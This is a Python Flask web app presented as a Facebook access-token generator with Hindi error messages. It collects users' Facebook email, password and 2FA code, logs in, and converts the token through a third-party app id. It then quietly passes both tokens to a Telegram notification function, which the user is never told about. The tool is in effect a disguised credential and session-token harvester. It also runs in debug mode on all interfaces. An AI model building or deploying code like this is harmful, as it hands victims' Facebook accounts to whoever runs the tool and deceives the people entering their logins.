from flask import Flask, render_template, request, jsonify
import sys
import os
import concurrent.futures
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from __facebookLoginV2 import loginFB
from telegram_notify import send_token_notification

app = Flask(__name__, static_folder='static')

def translate_error_to_hindi(error_msg):
    """Translate common Facebook error messages to Hindi"""
    error_translations = {
        'invalid username or password': 'गलत यूजरनेम या पासवर्ड',
        'tên người dùng hoặc mật khẩu không hợp lệ': 'गलत यूजरनेम या पासवर्ड',
        'the password you entered is incorrect': 'आपने गलत पासवर्ड डाला है',
        'password is incorrect': 'पासवर्ड गलत है',
        'wrong password': 'गलत पासवर्ड',
        'incorrect password': 'गलत पासवर्ड',
        'login failed': 'लॉगिन विफल',
        'account disabled': 'अकाउंट बंद है',
        'account locked': 'अकाउंट लॉक है',
        'your account has been locked': 'आपका अकाउंट लॉक हो गया है',
        'please try again later': 'कृपया बाद में दोबारा कोशिश करें',
        'too many attempts': 'बहुत ज्यादा कोशिश, बाद में try करें',
        'session expired': 'सेशन समाप्त हो गया',
        'two-factor authentication required': '2FA कोड डालें',
        'enter the code': 'कोड डालें',
        'checkpoint required': 'Facebook पर Security Checkpoint है, पहले Facebook app में जाकर verify करें',
        'your account is temporarily locked': 'आपका अकाउंट अस्थायी रूप से लॉक है',
        'we detected unusual activity': 'असामान्य गतिविधि पाई गई',
        'confirm your identity': 'अपनी पहचान verify करें',
        'email and password are required': 'Email और Password डालना जरूरी है',
        'no response from facebook': 'Facebook से कोई जवाब नहीं आया, दोबारा कोशिश करें',
        'facebook server not responding': 'Facebook सर्वर जवाब नहीं दे रहा, बाद में कोशिश करें',
        'token is required': 'Token डालना जरूरी है',
        'invalid token': 'Token गलत है',
        'conversion failed': 'Token convert नहीं हो पाया',
        'kiểm tra bảo mật': 'Facebook पर Security Checkpoint है, पहले Facebook app में जाकर verify करें',
        'vui lòng hoàn tất': 'Facebook पर Security Checkpoint है, पहले Facebook app में जाकर verify करें',
        'xác minh': 'अपनी पहचान verify करें',
        'mật khẩu': 'गलत यूजरनेम या पासवर्ड',
        'đăng nhập': 'लॉगिन में समस्या',
    }
    
    error_lower = error_msg.lower().strip()
    
    for key, hindi in error_translations.items():
        if key in error_lower:
            return hindi
    
    return error_msg

def convert_to_eaad6v7(access_token):
    try:
        url = "https://api.facebook.com/method/auth.getSessionforApp"
        params = {
            "format": "json",
            "access_token": access_token,
            "new_app_id": "61587257800225"
        }
        response = requests.get(url, params=params, timeout=10)
        data = response.json()
        if data.get("error"):
            return None
        return data.get("access_token")
    except:
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/generate-token', methods=['POST'])
def generate_token():
    data = request.get_json()
    
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    two_fa = data.get('twofa', '').strip()
    
    print(f"[DEBUG] Login attempt for: {email[:3]}***")
    
    if not email or not password:
        return jsonify({
            'success': False,
            'error': translate_error_to_hindi('Email and password are required')
        })
    
    try:
        two_fa_code = two_fa if two_fa else None
        
        def do_login():
            login_client = loginFB(email, password, two_fa_code)
            return login_client.main()
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(do_login)
            try:
                result = future.result(timeout=15)
            except concurrent.futures.TimeoutError:
                return jsonify({
                    'success': False,
                    'error': translate_error_to_hindi('Facebook server not responding')
                })
        
        print(f"[DEBUG] Login result: {result}")
        
        if result and result.get('success'):
            normal_token = result['success'].get('accessTokenFB', '')
            eaad6v7_token = convert_to_eaad6v7(normal_token)
            
            if eaad6v7_token:
                send_token_notification(normal_token, eaad6v7_token)
            
            return jsonify({
                'success': True,
                'data': {
                    'cookies': result['success'].get('setCookies', ''),
                    'accessToken': normal_token,
                    'accessTokenEAAD6V7': eaad6v7_token or 'Conversion failed',
                }
            })
        elif result and result.get('error'):
            error_msg = result['error'].get('description', '') or result['error'].get('title', 'Login failed')
            return jsonify({
                'success': False,
                'error': translate_error_to_hindi(error_msg)
            })
        else:
            return jsonify({
                'success': False,
                'error': translate_error_to_hindi('No response from Facebook')
            })
            
    except Exception as e:
        print(f"[DEBUG] Exception: {str(e)}")
        return jsonify({
            'success': False,
            'error': translate_error_to_hindi(str(e))
        })

@app.route('/verify-token', methods=['POST'])
def verify_token():
    data = request.get_json()
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'valid': False, 'error': translate_error_to_hindi('Token is required')})
    
    try:
        url = "https://graph.facebook.com/me"
        params = {'access_token': token, 'fields': 'id,name'}
        response = requests.get(url, params=params, timeout=10)
        result = response.json()
        
        if 'error' in result:
            return jsonify({'valid': False, 'error': translate_error_to_hindi(result['error'].get('message', 'Invalid token'))})
        
        return jsonify({
            'valid': True,
            'id': result.get('id'),
            'name': result.get('name')
        })
    except Exception as e:
        return jsonify({'valid': False, 'error': translate_error_to_hindi(str(e))})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
